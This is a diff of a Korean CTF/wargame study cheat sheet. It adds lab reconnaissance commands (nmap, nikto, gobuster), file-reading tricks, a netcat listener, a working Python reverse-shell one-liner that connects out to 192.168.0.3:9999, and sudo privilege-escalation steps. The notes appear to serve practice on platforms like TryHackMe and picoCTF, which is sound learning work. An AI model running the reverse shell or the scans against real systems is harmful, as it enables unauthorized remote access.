@@ -17,7 +17,7 @@ wargame은 자신의 페이스로 진행할 수 있는 환경입니다.
 - 해외
     - [picoCTF](https://picoctf.org/)
     - [ctflearn](https://ctflearn.com/)
-    - [tryhackme](https://tryhackme.com/)
+    - [TryHackMe](https://tryhackme.com/)
     - [HACT THE BOX](https://www.hackthebox.com/)
     - [cryptopals](https://cryptopals.com/) - 크립토
     - [traboda](https://app.traboda.com/challenges)
@@ -859,4 +859,65 @@ headers = {'Content-Type': 'application/json; charset=utf-8'}
 cookies = {'session': 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YqYw8w.fA59ny4Zdysw-0EsKpW12QKzIno'}
 
 res = requests.get("http://mercury.picoctf.net:44693/search", headers=headers, cookies=cookies)
+```
+
+# 19. nmap
+```
+nmap -sC -sV -oN nmap/initial 10.10.246.239
+```
+
+# 20. nikto
+```
+nikto -h http://10.10.246.239 | tee nikto.log
+```
+
+# 21. gobuster
+url 스캔
+```
+gobuster dir -u http://10.10.246.239 -w /Users/skyepodium/pwnable/wordlist/node-dirbuster/lists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css,py
+```
+
+# 22. linux read file
+```
+# readfile
+cat
+tac
+head
+tail
+while read line; do echo $line; done < clue.txt
+grep . clue.txt
+
+# read all file in directory
+grep -R .
+
+### editor
+more
+nano
+vim
+vi
+```
+
+# 23. reverse shell
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+### 1) netcat port listening
+```
+nc -lvn 9999
+```
+
+### 2) open
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.3",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh", "-i"]);'
+```
+
+# 24. root 권한
+### 1) sudo 옵션 확인
+```
+sudo -l
+```
+
+### 2) root 권한 얻기
+```
+sudo su
+sudo bash
 ```
